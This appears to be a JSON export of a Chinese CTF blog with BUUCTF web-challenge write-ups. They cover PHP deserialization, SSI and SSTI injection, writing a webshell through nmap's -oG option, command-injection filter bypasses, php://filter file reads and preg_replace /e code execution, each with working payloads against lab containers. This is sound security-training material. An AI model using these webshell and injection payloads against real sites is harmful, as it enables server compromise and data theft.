[{"title":"buuctf22","date":"2021-08-02T12:02:24.000Z","path":"2021/08/02/buuctf22/","text":"","tags":[]},{"title":"buuctf21","date":"2021-08-01T04:16:03.000Z","path":"2021/08/01/buuctf21/","text":"[NPUCTF2020]ReadlezPHP打开容器，发现页面还“挺干净的” 一.初步探索查看源码： 可以看到他是通过定向一个文件来获取时间信息的 访问一下这个文件： 二.代码审计存在一个类HelloPhp，值得注意的是$b($a)，感觉可以构造$b=system，$a=ls，来达到rce 构造序列化 payload：?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;ls&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125; 看来没有rec成功，看来是过滤了，看了wp学了一下别的姿势 三.预备知识assert()函数： 判断一个表达式是否成立。返回true or false。 当参数为字符串时，会被当作php代码执行。 这里要注意assert与eval的区别 assert把整个字符串参数当php代码执行； eval把合法的php代码执行。 举两个例子： assert(eval(‘echo 1;’)); 直接传递普通代码是无法执行的，如：assert(‘echo 1;’); 四.思路构建我们构造： $a=phpinfo()；$b=assert payload：?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; 然后Ctrl+f搜索flag 参考资料：https://www.cnblogs.com/sn00py/p/5925944.html https://blog.csdn.net/whatday/article/details/59168605?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control https://blog.csdn.net/RABCDXB/article/details/116140760?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.control","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf20","date":"2021-07-31T09:52:20.000Z","path":"2021/07/31/buuctf20/","text":"[BJDCTF2020]EasySearch打开容器，发现是一个登入页面 一.初步探索尝试sql注入，但是不管输入什么都是回显 看来不是考察SQL注入，看一下源码，也没有什么线索，用dirsearch根本跑不出来，buu会一直崩。 只能手工来测试了，之前有存一个常见文件备份后缀的名单 运气比较好，第二个就试出来了源码泄露： 二.代码审计POST参数$username和$password，if语句判断$password经过MD5编码后截取前六位是否等于6d0bc1 然后他会构建一个文件的路径，路径的其中一部分是调用get_hash()函数随机生成的 不过他这个.shtnl后缀的文件是什么我还是第一次见 三.预备知识 shtml简介 SSI（Server Side Include)，通常称为服务器端嵌入，是一种类似于ASP的基于服务器的网页制作技术。大多数（尤其是基于Unix平台）的WEB服务器如Netscape Enterprise Server等均支持SSI命令。 SSI工作原理：在一个通常**以.shtml为扩展名**的SSI文件中，标准的HTML编码会被直接送到浏览器上，而内嵌Perl语言形式的SSI命令则先被网络服务器解释执行，如果是标准输出的话，输出信息也将作为标准的HTML而被送至浏览器。 SSI远程命令执行漏洞 详见：https://cloud.tencent.com/developer/article/1540513 ​ https://blog.csdn.net/qq_40657585/article/details/84260844 四.思路构建我们先登入manage system看看。那么首先要找到符合if语句的$password 拿别人的脚本跑一下： POST数据 发现回显给我们一个文件名，这个就是源码里构造的文件名了 访问一下： 那我们现在要想怎么利用这个SSI注入了，由于$password的值被强制了，根据网页的回显感觉那注入点可能在$username或者cilent-ip 但是我伪造cilent-ip发现回显的Client IP的值都不会变，包括XFF也是，那么只剩下$username最后的希望了 访问回显的文件 成功回显当前文件夹目录，但是flag不在这个目录下，访问上一级目录： cat flag文件","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf19","date":"2021-07-30T04:12:47.000Z","path":"2021/07/30/buuctf19/","text":"[CISCN2019 华东南赛区]Web11打开容器，浏览网页发现以下注意点 看到是基于Smarty模板的API，那么这里我们会联想到会不会存在SSTI注入，而且我们之前有做过类似的，根据XFF获取我们的ip，因此试试注入点会不会在文件头的XFF中 可以看到它执行了我们的运算式，那么说明存在SSTI注入 直接cat flag 参考资料：https://blog.csdn.net/m0_56059226/article/details/118804585 http://www.mamicode.com/info-detail-2969943.html [MRCTF2020]PYWebsite打开容器，发现叫我们购买东西 一.初步探索查看源码，发现一段js代码： 12345678910111213141516171819202122&lt;script&gt;function enc(code)&#123; hash = hex_md5(code); return hash;&#125;function validate()&#123; var code = document.getElementById(&quot;vcode&quot;).value; if (code != &quot;&quot;)&#123; if(hex_md5(code) == &quot;0cd4da0223c0b280829dc3ea458d655c&quot;)&#123; alert(&quot;您通过了验证！&quot;); window.location = &quot;./flag.php&quot; &#125;else&#123; alert(&quot;你的授权码不正确！&quot;); &#125; &#125;else&#123; alert(&quot;请输入授权码&quot;); &#125;&#125; &lt;/script&gt; 当我们输入的code经过hex_md5编码后等于0cd4da0223c0b280829dc3ea458d655c时会重定向到flag.php，那么我们直接访问flag.php 回显得： 这里有两个暗示点，感觉在暗示我们伪造XFF，抓包更改文件头：","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buutcf18","date":"2021-07-29T14:08:58.000Z","path":"2021/07/29/buutcf18/","text":"[网鼎杯 2020 朱雀组]Nmap这题和之前的[BUUCTF 2018]Online Tool很像 试用之前的payload： 1&#39;&lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.php &#39; 回显 说明存在防火墙过滤，fuzz发现过滤了php 这里我们利用短标签绕过=替换第一个php，用phtml替换第二个php payload： 1&#39;&lt;?&#x3D;@eval($_POST[&quot;hack&quot;]);?&gt; -oG webshell.phtml &#39; 回显 但是我们这边不知道为什么没办法用蚁剑直接连接 源码提示flag在根目录下 尝试POST命令","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf17","date":"2021-07-27T10:01:24.000Z","path":"2021/07/27/buuctf17/","text":"[安洵杯 2019]easy_serialize_php打开容器，发现源码： 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123; $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;); $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;; return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125; 一.代码审计 通过GET方式获取变量f，将其赋值给 $function。 if语句判断$function的值：1.$function == &#39;highlight_file&#39;，执行highlight_file(&#39;index.php&#39;)； ​ 2.$function == &#39;phpinfo&#39;，执行 eval(&#39;phpinfo();&#39;); ​ 3.$function == &#39;show_image&#39;，执行$userinfo = unserialize($serialize_info);​ echo file_get_contents(base64_decode($userinfo[&#39;img&#39;])); extract($_POST)将我们POST的数组中的变量导入到当前的符号表。可以实现变量覆盖。 什么意思呢？举个例子：当我们传入$_SESSION[flag]=123时，$_SESSION[“user”]和$_SESSION[‘function’] 全部会消失，只剩下$_SESSION[flag]=123。 $_SESSION是一个变量数组，有三个元素： $_SESSION[“user”]; $_SESSION[‘function’]; $_SESSION[‘img’]; ​ 其中$_SESSION[“user”]，$_SESSION[‘function’]都是可以直接控制的变量，而当我们给$_SESSION[‘img’]赋值时，会格外调用sha1()加密一次。 服务器后台对$_SESSION先序列化一次，同时过滤&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;字符串，然后赋值给$serialize_info；通过反序列化$serialize_info获取$userinfo的值。 二.知识点 数组的序列化 举个例子来理解： 1234567891011121314151617&lt;?php$img[&#x27;one&#x27;] = &quot;flag&quot;;$img[&#x27;two&#x27;] = &quot;test&quot;;$a = serialize($img);var_dump($a);#输出: string(48) &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;$b = unserialize($a);var_dump($b);/*输出如下内容:array(2) &#123; [&quot;one&quot;]=&gt; string(4) &quot;flag&quot; [&quot;two&quot;]=&gt; string(4) &quot;test&quot;&#125;*/ 2.php反序列化字符逃逸 一个正常的反序列化： 1234&lt;?php$str=&#x27;a:2:&#123;i:0;s:6:&quot;linbei&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#x27;;var_dump(unserialize($str));&gt; 结果： 1234array(2) &#123; [0]&#x3D;&gt; string(6) &quot;linbei&quot; [1]&#x3D;&gt; string(5) &quot;aaaaa&quot; &#125; php反序列化字符逃逸： 1234&lt;?php$str=&#x27;a:2:&#123;i:0;s:6:&quot;linbei&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;s:5:&quot;12345&quot;;&#125;&#x27;;var_dump(unserialize($str));&gt; 这样的结果也还是： 1234array(2) &#123; [0]&#x3D;&gt; string(6) &quot;linbei&quot; [1]&#x3D;&gt; string(5) &quot;aaaaa&quot; &#125; 原因是在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化。 三.思路构建我们看到代码段有一个hint，试着构建f=phpinfo phpinfo中会显示很多配置项，我们看到auto_append_file=d0g3_f1ag.php，会在页面底部加载d0g3_f1ag.php文件，那么很可能flag在这里面。对d0g3_f1ag.php base64编码 我们在源码中看到当GET的f=show_image时会调用file_get_contents函数，但是他的参数时base64编码的img，我们已知img是不可控的，但是我们这里可以利用他序列化后又反序列化过程的反序列化字符逃逸。 我们POST下面字符串： 1_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; //这里我们没有对$_SESSION[&#x27;img&#x27;]赋值，因此会被默认赋值base64_encode(&#x27;guest_img.png&#x27;) 传入后台后，$_SESSION变量数组有三个元素： 123$_SESSION[&quot;user&quot;]=&#x27;flagflagflagflagflagflag&#x27;；$_SESSION[&quot;function&quot;]=&#x27;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&#x27;;$_SESSION[&quot;img&quot;]=base64_encode(&#x27;guest_img.png&#x27;); 序列化后的字符串： 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125; filter过滤后的序列化字符串： 1a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125; 这样的序列化字符串反序列化后得 123$_SESSION[&quot;user&quot;]=&#x27;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&#x27;；$_SESSION[&quot;function&quot;]=1234567;$_SESSION[&quot;img&quot;]=ZDBnM19mMWFnLnBocA==; 这样我们利用反序列化字符逃逸就达到了我们给img赋值的目的 页面没有回显，查看源码： base64编码/d0g3_fllllllag 刚好这串字符串长度也是20，直接带入到我们上面的payload： 1_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:8:&quot;function&quot;;s:7:&quot;1234567&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125; 参考资料：https://blog.csdn.net/qq_43622442/article/details/106003691 https://www.jianshu.com/p/8e8117f9fd0e https://www.cnblogs.com/h3zh1/p/12732336.html","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf16","date":"2021-07-26T02:29:20.000Z","path":"2021/07/26/buuctf16/","text":"打开容器，没什么信息，查看源码也没什么信息 一.初步探索看看robots.txt有没有什么信息 访问这个文件： 返回了一个假的flag，但是我们注意到回文中有一个Look_at_me: /fl4g.php； 访问这个fl4g.php文件： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;img src=&quot;/img.jpg&quot;&gt;&lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo &quot;鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�&quot;); &#125;&#125;else&#123; die(&quot;鍘婚潪娲插惂&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5($md5)) echo &quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;; else die(&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;);&#125;else&#123; die(&quot;鍘婚潪娲插惂&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;; system($get_flag);.. &#125;else&#123; die(&quot;蹇埌闈炴床浜�&quot;); &#125;&#125;else&#123; die(&quot;鍘婚潪娲插惂&quot;);&#125;?&gt; 二.代码审计我们要绕过三个if语句： GET变量$num，intval判断$num是否小于2020，$num+1是否大于2021； GET变量$md5，if判断$md5 MD5编码后是否弱等于其本身； GET变量$get_flag，先判断$get_flag中是否存在空格，不存在则执行system($get_flag)，同时过滤了cat命令。 三.思路构建那么我们一层层绕过： 关于intval()函数：直到遇上数字或正负符号才开始做转换，在遇到非数字或字符串结束时()结束转换。 我们可以看到当intval的参数含e且没加单引号为科学计数法数值时，加了单引号则被视为是字符，根据intval()函数的特性就会结束转换。我们注意到我们这里GET的变量是有单引号包括，因此我们测试一下&#39;1e4&#39;+1的值是2还是10001，但是不管在本地怎么调试都是下面这个结果： 为什么会这样呢？查阅了一下官方文档 原来是版本的问题，测试后发现&#39;num&#39;+1会强行转化为整数型，因此这里我们就可以绕过第一个if语句了 payload：?num=1e4 我们需要找到一个MD5编码后弱等于它本身的字符串，上网查找：0e215962017符合要求 payload：?md5=0e215962017 虽然禁用了cat命令，但是我们可以用tac命令替代或者ca\\t绕过；由于过滤了空格符，但是我们可以用$IFS$9代替 payload：?get_flag=tac$IFS$9/flag 还有一些别的空格绕过利用： %09(需要php环境) $&#123;IFS&#125; $IFS$9 整合payload：/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$9/flag; 但是我们这边没有得到flag，先查看一下目录：/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=ls; flag可能在这里面 修改payload：/fl4g.php?num=1e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag; 参考资料：https://www.php.net/manual/zh/function.intval.php https://blog.csdn.net/weixin_39813200/article/details/116073792 https://www.cnblogs.com/llllll7/p/14847528.html https://www.cnblogs.com/wrnan/p/12658842.html","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf15","date":"2021-07-25T08:55:25.000Z","path":"2021/07/25/buuctf15/","text":"[BSidesCF 2020]Had a bad day打开容器 一.初步探索发现有两个按钮 先查看源码，没有什么线索，点击WOOFERS返回一张狗的图片 点击MEOWERS返回一张猫的图片。两个页面查看了源码都没有什么线索，但是我们注意到URL栏有参数传递，试试改成woofers&#39; 我们看到服务器后台用include()函数包含woofers文件，同时他帮我们拼接了文件后缀。 我们先试试看woofers文件同级目录下有没有存在flag文件： payload：woofers/../flag 页面没有回显，但是查看源码发现一串hint。 因为存在include()函数，我们就想到php://filter文件读取流读取文件： payload：php://filter/convert.base64-encode/resource=index 回显一串base64编码字符串，解码得： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;Images that spark joy&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt; &lt;title&gt;Had a bad day?&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;material.min.css&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;style.css&quot;&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;div class&#x3D;&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt; &lt;header class&#x3D;&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt; &lt;div class&#x3D;&quot;mdl-layout__header-row&quot;&gt; &lt;span class&#x3D;&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;&#x2F;span&gt; &lt;div class&#x3D;&quot;mdl-layout-spacer&quot;&gt;&lt;&#x2F;div&gt; &lt;div&gt; &lt;&#x2F;header&gt; &lt;div class&#x3D;&quot;page-ribbon&quot;&gt;&lt;&#x2F;div&gt; &lt;main class&#x3D;&quot;page-main mdl-layout__content&quot;&gt; &lt;div class&#x3D;&quot;page-container mdl-grid&quot;&gt; &lt;div class&#x3D;&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;&#x2F;div&gt; &lt;div class&#x3D;&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt; &lt;div class&#x3D;&quot;page-crumbs mdl-color-text--grey-500&quot;&gt; &lt;&#x2F;div&gt; &lt;h3&gt;Cheer up!&lt;&#x2F;h3&gt; &lt;p&gt; Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up! &lt;&#x2F;p&gt; &lt;div class&#x3D;&quot;page-include&quot;&gt; &lt;?php $file &#x3D; $_GET[&#39;category&#39;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D; false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#39;.php&#39;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; &lt;&#x2F;div&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;get&quot; id&#x3D;&quot;choice&quot;&gt; &lt;center&gt;&lt;button onclick&#x3D;&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name&#x3D;&quot;category&quot; value&#x3D;&quot;woofers&quot; class&#x3D;&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded&#x3D;&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class&#x3D;&quot;mdl-button__ripple-container&quot;&gt;&lt;span class&#x3D;&quot;mdl-ripple is-animating&quot; style&#x3D;&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;button&gt; &lt;button onclick&#x3D;&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name&#x3D;&quot;category&quot; value&#x3D;&quot;meowers&quot; class&#x3D;&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded&#x3D;&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class&#x3D;&quot;mdl-button__ripple-container&quot;&gt;&lt;span class&#x3D;&quot;mdl-ripple is-animating&quot; style&#x3D;&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;button&gt;&lt;&#x2F;center&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;&#x2F;main&gt; &lt;&#x2F;div&gt; &lt;script src&#x3D;&quot;js&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 二.思路构建核心代码块： 1234567891011121314&lt;?php $file = $_GET[&#x27;category&#x27;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125; ?&gt; 我们看到他要求我们上传的参数中必须包含woofers或meowers或index，php://filter可以嵌套一层协议 payload：php://filter/convert.base64-encode/woofers/resource=flag，这样我们就绕过了if语句判断 对回显的字符串base64解码得flag [ASIS 2019]Unicorn shop打开容器 应该是叫我们购买独角兽 一.初步探索输入Item ID和Price，但是不管我们输入Item ID1-3中哪一组回显都是操作失败： 输入Item ID=4和price=1337时，回显： 也就是说price只允许上传一个字符，看来是做了限制。网页上没什么信息了，查看一下源码： 我们可以看到hint提示说utf-8很重要。因为传入UTF-8编码，在后端处理的过程中，发现该UTF-8编码无法解析为ASCII码时，会将其解析为Unicode编码。 二.思路构建这题我们的思路应该就是利用utf-8编码和unicode编码的转换，和Unicode编码安全问题。 那么我们要先找到一个对应阿拉伯数值大于1337的字符；可以在这上面找：https://www.compart.com/en/unicode/U+2187 搜索thousand： 我选择这个字符，代表阿拉伯数字一万： 然后把他的utf-8编码改成对应的Unicode编码：%E2%86%82 参考资料：https://blog.csdn.net/weixin_44377940/article/details/106800704 https://xz.aliyun.com/t/5402#toc-0","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf14","date":"2021-07-24T03:50:03.000Z","path":"2021/07/24/buuctf14/","text":"[BJDCTF2020]ZJCTF，不过如此打开容器 一.初步探索发现网页显示一段代码： 123456789101112131415161718&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; die(&quot;Not now!&quot;); &#125; include($file); //next.php &#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 代码审计：上传两个参数，第一个if语句判断是否存在文件名text的文件，文件内容是否为I have a dream，这里可以用data://伪协议绕过；第二个if语句判断上传的$file参数中是否含flag，不含则执行include($file)，这里可以利用filter://伪协议读取文件信息。一开始我是想通过fla/g.php绕过正则匹配直接获取flag，但是他没有回显说明绕过了，但是没什么用，因此还是乖乖的先读取next.php文件。 构造payload：?text=data:text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php 回显一串base64编码字符串，解码得： 1234567891011121314151617181920&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123; return preg_replace( &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;, &#x27;strtolower(&quot;\\\\1&quot;)&#x27;, $str );&#125;foreach($_GET as $re =&gt; $str) &#123; echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123; @eval($_GET[&#x27;cmd&#x27;]);&#125; 代码审计： 这里定义两个函数： complex()函数：调用preg_replace函数 preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 功能：搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。 参数说明： $pattern: 要搜索的模式，可以是字符串或一个字符串数组。 $replacement: 用于替换的字符串或字符串数组。 $subject: 要搜索替换的目标字符串或字符串数组。 $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。 $count: 可选，为替换执行的次数。 这里需要注意的是，这里的preg_replace 使用了 /e 模式，导致可以代码执行——preg_replace 函数在匹配到符号正则的字符串时，会将替换字符串（也就是 preg_replace 函数的第二个参数）当做代码来执行。但是这里的第二个参数不是固定的吗——strtolower(“\\\\1”)**，而eval(‘strtolower(“\\1”);’)** 结果为 \\\\1 实际上就是 \\1。 getFlag()函数：调用eval()函数，执行我们GET的$cmd参数值。 代码中还有一个陌生函数：foreach()函数 foreach 语法结构提供了遍历数组的简单方式。foreach 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法： foreach (iterable_expression as $value) foreach (iterable_expression as $key =&gt; $value) 第一种格式遍历给定的 iterable_expression 迭代器。每次循环中，当前单元的值被赋给 $value。 第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 $key。 二.思路构建要怎么利用 preg_replace /e 模式下的代码执行这一特性呢？查看资料，原来对一个正则表达式模式或部分模式 两边添加圆括号 将导致相匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#39;\\n&#39; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 因此这里的\\1指的是第一个匹配项。那么我们的思路就是构造payload是第一个匹配项为getFlag()函数； 利用foreach()函数的特性上传?\\S*=getFlag()，但是这样是调用不了getFlag()函数的，为什么呢？在php中，双引号里面如果包含有变量，php解释器会进行解析；单引号中的变量不会被处理。 而这里的strtolower(“\\\\1”)，里面是双引号，所以我们要上传一个变量。 因此改版后的payload为：next.php?\\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;); 参考资料：https://www.php.net/manual/zh/language.variables.variable.php https://blog.csdn.net/qq_43622442/article/details/106018883 https://xz.aliyun.com/t/2557 https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html","tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"buuctf13","date":"2021-07-23T02:26:27.000Z","path":"2021/07/23/buuctf13/","text":"打开容器，发现网页每隔几秒就会刷新一次 一.初期探索查看网页源码，没什么线索，抓包试试 